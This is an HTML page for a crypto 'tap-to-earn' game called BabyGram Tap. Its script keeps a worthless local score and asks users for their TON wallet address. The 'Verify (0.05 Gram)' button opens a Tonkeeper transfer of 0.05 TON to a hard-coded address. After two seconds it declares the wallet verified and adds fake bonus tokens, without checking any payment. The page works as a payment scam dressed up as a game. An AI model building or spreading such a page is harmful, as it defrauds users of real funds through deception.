<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BabyGram Game</title>
    <style>
        body {
            background-color: #0b132b;
            color: #ffffff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            margin: 0;
            user-select: none;
        }
        .card {
            background: #1c2541;
            border-radius: 16px;
            padding: 20px;
            max-width: 350px;
            margin: 0 auto;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        .tap-btn {
            width: 140px;
            height: 140px;
            margin: 20px auto;
            border-radius: 50%;
            background: radial-gradient(circle, #3a86ff, #1d3557);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 20px;
            font-weight: bold;
            box-shadow: 0 0 20px rgba(58, 134, 255, 0.6);
        }
        .tap-btn:active {
            transform: scale(0.95);
        }
        .action-button {
            background: #3a86ff;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-weight: bold;
            width: 100%;
            margin-top: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>BabyGram Tap 💎</h2>
        <div id="balance" style="font-size: 24px; color: #4cc9f0; margin: 15px 0;">0 $BABYGRAM</div>
        
        <div class="tap-btn" id="coin">TAP ME</div>

        <button class="action-button" onclick="connectWallet()">Connect Wallet</button>
        <button class="action-button" style="background: #ef4444;" onclick="verifyWallet()">Verify (0.05 Gram)</button>
        <button class="action-button" style="background: #10b981;" onclick="joinChannel()">Join Channel (+1000)</button>
    </div>

    <script>
        let score = parseInt(localStorage.getItem('score')) || 0;
        let isConnected = localStorage.getItem('connected') === 'true';
        let isVerified = localStorage.getItem('verified') === 'true';

        const balanceEl = document.getElementById('balance');
        const coinEl = document.getElementById('coin');

        function updateDisplay() {
            balanceEl.innerText = score.toLocaleString() + " $BABYGRAM";
        }

        coinEl.addEventListener('click', function() {
            score += 1;
            localStorage.setItem('score', score);
            updateDisplay();
        });

        function connectWallet() {
            let addr = prompt("Enter your TON Wallet Address:");
            if (addr && addr.length > 5) {
                localStorage.setItem('connected', 'true');
                isConnected = true;
                alert("Wallet Connected Successfully!");
            }
        }

        function verifyWallet() {
            if (!isConnected) {
                alert("Please connect wallet first!");
                return;
            }
            window.open("https://app.tonkeeper.com/transfer/UQB8E5UreO3ujV4ArV9AI28kGhznU-9ExPDjn6bQ2v9NJEj1?amount=50000000&text=Verify", "_blank");
            setTimeout(function() {
                localStorage.setItem('verified', 'true');
                score += 1000;
                localStorage.setItem('score', score);
                updateDisplay();
                alert("Wallet Verified & +1000 Bonus Added!");
            }, 2000);
        }

        function joinChannel() {
            window.open("https://t.me/BabyGramHQ", "_blank");
            setTimeout(function() {
                score += 1000;
                localStorage.setItem('score', score);
                updateDisplay();
                alert("+1000 Tokens added for joining channel!");
            }, 2000);
        }

        updateDisplay();
    </script>
</body>
</html>
